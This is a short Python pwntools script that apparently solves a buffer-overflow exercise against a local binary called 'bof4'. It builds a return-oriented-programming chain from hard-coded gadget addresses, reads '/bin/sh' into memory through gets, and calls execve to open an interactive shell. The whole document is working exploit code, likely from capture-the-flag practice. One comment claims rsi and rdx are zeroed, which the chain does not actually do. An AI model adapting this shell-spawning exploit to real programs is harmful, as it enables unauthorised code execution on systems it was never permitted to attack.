#!/bin/python3
from pwn import *
p = process('./bof4')
exe = ELF('./bof4',checksec=False)

# control register rdi, rsi, rax, rdx
pop_rdi = 0x000000000040220e;
pop_rbx = 0x0000000000403e99;
pop_rsi = 0x00000000004015ae;
pop_rdx = 0x00000000004043e4;
pop_rax = 0x0000000000401001;
syscall = 0x000000000040132e;
rw_section = 0x406e00;
# /bin/sh
#execve("/bin/sh", 0, 0);
payload = b'A'*88
payload += p64(pop_rdi) + p64(rw_section)
payload += p64(exe.symbols['gets'])
#reassign rdi value
payload += p64(pop_rdi) + p64(rw_section)
#assign rdx and rsi values to 0 because it doesn;'t need anymore 
payload += p64(pop_rax) + p64(0x3b)
payload += p64(syscall)
#0xf30000441f0f66c3

input()
p.sendlineafter(b'something:',payload)
p.sendline(b'/bin/sh')
p.interactive()

